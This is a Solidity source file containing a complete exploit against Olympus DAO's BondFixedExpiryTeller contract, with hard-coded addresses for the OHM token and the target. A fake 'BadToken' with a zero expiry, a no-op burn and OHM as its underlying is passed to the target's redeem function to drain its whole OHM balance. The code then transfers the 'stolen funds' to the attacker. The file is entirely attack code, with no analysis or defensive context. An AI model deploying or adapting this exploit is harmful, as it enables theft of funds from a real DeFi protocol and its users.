//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.9;

// ERC20 Interface
interface ERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// BondFixedExpiryTeller Interface
interface BondFixedExpiryTeller {
    function redeem(address token_, uint256 amount_) external payable;
    function setAuthority(address _newAuthority) external payable;
    function owner() external returns (address);
}

contract BadToken {
    // Address of OHM Token
    ERC20 constant tokenContract = ERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);

    function expiry() external pure returns (uint48 _expiry) {
        // Return a timestamp anytime before now
        return uint48(0x0);
    }

    function burn(address from, uint256 amount) external pure {}

    function underlying() external pure returns (ERC20 _underlying) {
        return tokenContract;
    }
}

// AttactContract Class
contract AttackContract {
    address immutable owner = tx.origin;

    // Address of OHM Token
    ERC20 constant tokenContract = ERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);

    // Address of Olympus DAOs BondFixedExpiryTeller contract
    BondFixedExpiryTeller constant targetContract = BondFixedExpiryTeller(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156);
    
    event CallFailed(bytes reason);

    // Entry point for the attack, this will be called by an EOA using JavaScript
    function startAttack() external {
        require(tx.origin == owner);

        // Get OHM Token balance of the target contract
        uint256 targetBalance = tokenContract.balanceOf(address(targetContract));

        // Start attack by calling the target contract's redeem function
        // - arg1: this contracts deployed address
        // - arg2: the target address's balance of OHM Token
        //try targetContract.redeem(address(this), targetBalance) {
        BadToken badToken = new BadToken();
        targetContract.redeem(address(badToken), targetBalance);

        // transfer stolen funds from this contract to transaction originator
        tokenContract.transfer(tx.origin, targetBalance);
    }
}